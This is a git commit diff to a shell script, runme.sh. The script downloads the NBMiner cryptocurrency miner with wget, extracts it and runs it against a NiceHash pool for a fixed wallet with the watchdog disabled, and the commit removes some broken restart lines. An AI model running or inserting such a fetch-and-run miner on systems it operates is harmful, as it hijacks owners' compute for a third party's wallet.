6dfdd9bbee3044130a3f3aa5ec48d05e2dbb9b95
Kief5555 <67562560+Kief5555@users.noreply.github.com>
2022-01-27 19:37:26 -0800

    Update runme.sh

--- runme.sh
+++ runme.sh
@@ -1,6 +1,2 @@
 wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz && tar -xf  NBMiner_39.2_Linux.tgz && cd NBMiner_Linux && 
 ./nbminer -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 3F8eMXyShK8d1dZFtBr13hcAHMMGJDKDSM -p x --no-watchdog
-
-
-timeout 5m pkill nbminer
-timeout 1m ./nbminer -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 3F8eMXyShK8d1dZFtBr13hcAHMMGJDKDSM -p x --no-watchdog sleep 5; done
